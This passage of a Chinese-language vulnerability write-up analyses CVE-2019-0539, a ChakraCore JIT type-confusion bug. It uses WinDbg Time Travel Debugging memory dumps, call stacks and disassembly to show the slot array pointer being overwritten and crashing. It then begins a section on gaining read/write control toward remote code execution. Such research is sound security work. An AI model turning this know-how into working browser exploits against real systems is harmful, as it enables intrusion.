    00000195`cc9c0141 33d2            xor     edx,edx
    00000195`cc9c0143 4c3b2cc1        cmp     r13,qword ptr [rcx+rax*8]
    00000195`cc9c0147 0f85e2000000    jne     00000195`cc9c022f
    00000195`cc9c014d 480f45da        cmovne  rbx,rdx
    00000195`cc9c0151 488b4310        mov     rax,qword ptr [rbx+10h]
    00000195`cc9c0155 4d896610        mov     qword ptr [r14+10h],r12 // trigger of CVE-2019-0539. Overridden slot array pointer
下面是在JIT代码调用`OP_InitClass`前的对象的内存dump。注意两个对象slots是如何在对象内存中内联（而不是存储在独立的slot
array中）。
    Time Travel Position: 8FE48:C95
    chakracore!Js::JavascriptOperators::OP_InitClass:
    00007ffe`9c674180 4c89442418      mov     qword ptr [rsp+18h],r8 ss:00000086`971fd710=00000195ca395030
    0:004> dps 00000195`cd274440
    00000195`cd274440  00007ffe`9d6e1790 chakracore!Js::DynamicObject::`vftable'
    00000195`cd274448  00000195`ca3c1d40
    00000195`cd274450  00010000`00000001 // inline slot 1
    00000195`cd274458  00010000`00000001 // inline slot 2
    00000195`cd274460  00000195`cd274440
    00000195`cd274468  00010000`00000000
    00000195`cd274470  00000195`ca3b4030
    00000195`cd274478  00000000`00000000
    00000195`cd274480  00000195`cd073ed0
    00000195`cd274488  00000000`00000000
    00000195`cd274490  00000000`00000000
    00000195`cd274498  00000000`00000000
    00000195`cd2744a0  00000195`cd275c00
    00000195`cd2744a8  00010000`00000000
    00000195`cd2744b0  00000195`ca3dc100
    00000195`cd2744b8  00000000`00000000
下面的调用栈表明`OP_InitClass`最终会调用`SetIsPrototype`，从而触发对象类型转换。这种转换导致两个slots不再内联，而是存储在slot
array中。而且这种转换在随后会被JIT代码所忽略。
    0:004> kb
     # RetAddr           : Args to Child                                                           : Call Site
    00 00007ffe`9cd0dace : 00000195`cd274440 00000195`ca3a0000 00000195`00000004 00007ffe`9bf6548b : chakracore!Js::DynamicTypeHandler::AdjustSlots+0x79f [c:ppchakracorelibruntimetypestypehandler.cpp @ 755] 
    01 00007ffe`9cd24181 : 00000195`cd274440 00000195`cd264f60 00000195`000000fb 00007ffe`9c200002 : chakracore!Js::DynamicObject::DeoptimizeObjectHeaderInlining+0xae [c:ppchakracorelibruntimetypesdynamicobject.cpp @ 591] 
    02 00007ffe`9cd2e393 : 00000195`ca3da0f0 00000195`cd274440 00000195`00000002 00007ffe`9cd35f00 : chakracore!Js::PathTypeHandlerBase::ConvertToSimpleDictionaryType+0x1b1 [c:ppchakracorelibruntimetypespathtypehandler.cpp @ 1622] 
    03 00007ffe`9cd40ac2 : 00000195`ca3da0f0 00000195`cd274440 00000000`00000002 00007ffe`9bf9fe00 : chakracore!Js::PathTypeHandlerBase::TryConvertToSimpleDictionaryType+0x43 [c:ppchakracorelibruntimetypespathtypehandler.cpp @ 1598] 
    04 00007ffe`9cd3cf81 : 00000195`ca3da0f0 00000195`cd274440 00000195`00000002 00007ffe`9cd0c700 : chakracore!Js::PathTypeHandlerBase::TryConvertToSimpleDictionaryType+0x32 [c:ppchakracorelibruntimetypespathtypehandler.h @ 297] 
    05 00007ffe`9cd10a9f : 00000195`ca3da0f0 00000195`cd274440 00000001`0000001c 00007ffe`9c20c563 : chakracore!Js::PathTypeHandlerBase::SetIsPrototype+0xe1 [c:ppchakracorelibruntimetypespathtypehandler.cpp @ 2892] 
    06 00007ffe`9cd0b7a3 : 00000195`cd274440 00007ffe`9bfa722e 00000195`cd274440 00007ffe`9bfa70a3 : chakracore!Js::DynamicObject::SetIsPrototype+0x23f [c:ppchakracorelibruntimetypesdynamicobject.cpp @ 680] 
    07 00007ffe`9cd14b08 : 00000195`cd274440 00007ffe`9c20d013 00000195`cd274440 00000195`00000119 : chakracore!Js::RecyclableObject::SetIsPrototype+0x43 [c:ppchakracorelibruntimetypesrecyclableobject.cpp @ 190] 
    08 00007ffe`9c6743ea : 00000195`cd275c00 00000195`cd274440 0000018d`00000119 00000195`c9e85830 : chakracore!Js::DynamicObject::SetPrototype+0x18 [c:ppchakracorelibruntimetypesdynamictype.cpp @ 632] 
    09 00000195`cc9c0112 : 00000195`cd264f60 00000195`cd273eb0 00000195`c9e85830 00007ffe`9c20c9b3 : chakracore!Js::JavascriptOperators::OP_InitClass+0x26a [c:ppchakracorelibruntimelanguagejavascriptoperators.cpp @ 7532] 
    0a 00007ffe`9cbea0d2 : 00000195`ca3966e0 00000000`10000004 00000195`ca395030 00000195`cd274440 : 0x00000195`cc9c0112
下面是`OP_InitClass`调用后，对象的内存dump。可以观察到，对象已经被转换并且两个slots不再内联。但是，后续的JIT代码仍然会认为slots是内联的。
    Time Travel Position: 9001D:14FA
    00000195`cc9c0112 803e01          cmp     byte ptr [rsi],1 ds:0000018d`c8e72018=01
    0:004> dps 00000195`cd274440
    00000195`cd274440  00007ffe`9d6e1790 chakracore!Js::DynamicObject::`vftable'
    00000195`cd274448  00000195`cd275d40
    00000195`cd274450  00000195`cd2744c0 // slot array pointer (previously inline slot 1)
    00000195`cd274458  00000000`00000000
    00000195`cd274460  00000195`cd274440
    00000195`cd274468  00010000`00000000
    00000195`cd274470  00000195`ca3b4030
    00000195`cd274478  00000195`cd277000
    00000195`cd274480  00000195`cd073ed0
    00000195`cd274488  00000195`cd073f60
    00000195`cd274490  00000195`cd073f90
    00000195`cd274498  00000000`00000000
    00000195`cd2744a0  00000195`cd275c00
    00000195`cd2744a8  00010000`00000000
    00000195`cd2744b0  00000195`ca3dc100
    00000195`cd2744b8  00000000`00000000
    0:004> dps 00000195`cd2744c0 // slot array
    00000195`cd2744c0  00010000`00000001
    00000195`cd2744c8  00010000`00000001
    00000195`cd2744d0  00000000`00000000
    00000195`cd2744d8  00000000`00000000
    00000195`cd2744e0  00000119`00000000
    00000195`cd2744e8  00000000`00000100
    00000195`cd2744f0  00000195`cd074000
    00000195`cd2744f8  00000000`00000000
    00000195`cd274500  000000c4`00000000
    00000195`cd274508  00000000`00000102
    00000195`cd274510  00000195`cd074030
    00000195`cd274518  00000000`00000000
    00000195`cd274520  000000fb`00000000
    00000195`cd274528  00000000`00000102
    00000195`cd274530  00000195`cd074060
    00000195`cd274538  00000000`00000000
下面是JIT错误地分配了属性值、覆写 slot array 指针后的对象内存dump：
    0:004> dqs 00000195cd274440
    00000195`cd274440  00007ffe`9d6e1790 chakracore!Js::DynamicObject::`vftable'
    00000195`cd274448  00000195`cd275d40
    00000195`cd274450  00010000`00001234 // overridden slot array pointer (CVE-2019-0539)
    00000195`cd274458  00000000`00000000
    00000195`cd274460  00000195`cd274440
    00000195`cd274468  00010000`00000000
    00000195`cd274470  00000195`ca3b4030
    00000195`cd274478  00000195`cd277000
    00000195`cd274480  00000195`cd073ed0
    00000195`cd274488  00000195`cd073f60
    00000195`cd274490  00000195`cd073f90
    00000195`cd274498  00000000`00000000
    00000195`cd2744a0  00000195`cd275c00
    00000195`cd2744a8  00010000`00000000
    00000195`cd2744b0  00000195`ca3dc100
    00000195`cd2744b8  00000000`00000000
最终，当访问一个对象的属性时，被覆写的 slot array 指针将会被取消引用，从而导致Crash
    0:004> g
    (1e8c.20b8): Access violation - code c0000005 (first/second chance not available)
    First chance exceptions are reported before any exception handling.
    chakracore!Js::DynamicTypeHandler::GetSlot+0x149:
    00007ffe`9cd1ec79 488b04c1        mov     rax,qword ptr [rcx+rax*8] ds:00010000`00001234=????????????????
###  思考
由于Windbg添加的TTD，简化了调试过程。具体而言就是指设置断点、反向运行程序直到覆写slot
array指针的能力。这项功能确实展示了CPU跟踪和执行重建的能力，可用于软件调试以及逆向工程。
## 漏洞利用
###  简介
前文介绍了CVE-2019-0539漏洞的根源，本部分将继续研究如何实现完全的读写控制并最终实现RCE。这里需要重点注意的是：由于Microsoft
Edge引入了沙箱技术，因此为完全破坏系统，我们需要一个额外的漏洞来实现沙箱逃逸。
这里，我们要感谢 Lokihardt 和 Bruno Keith 在这一领域的惊人研究成果，他们的研究成果对我们下文的研究具有重要价值。
###  漏洞利用
由上一章的分析可知，该漏洞让我们能够实现覆写 javascript 对象的slot array指针。借鉴Bruno Keith在BlackHat 2019
上[提出](https://www.youtube.com/watch?v=lBL4KGIybWE)的奇妙的[研究成果](https://github.com/bkth/Attacking-Edge-Through-the-JavaScript-Compiler)，我们可以得知，在Chakra中，javascript 对象(`o={a: 1,
b: 2};`)是在`Js::DynamicObject`类中实现的，且可能有不同的内存布局，其属性 slot array
指针被称之为`auxSlots`。从`DynamicObject`类定义（位于`libRuntimeTypesDynamicObject.h`）中，可以得知Bruno
所讨论的三种可能的内存布局规范：
    // Memory layout of DynamicObject can be one of the following:
    //        (#1)                (#2)                (#3)
    //  +--------------+    +--------------+    +--------------+
    //  | vtable, etc. |    | vtable, etc. |    | vtable, etc. |
    //  |--------------|    |--------------|    |--------------|
    //  | auxSlots     |    | auxSlots     |    | inline slots |
    //  | union        |    | union        |    |              |
    //  +--------------+    |--------------|    |              |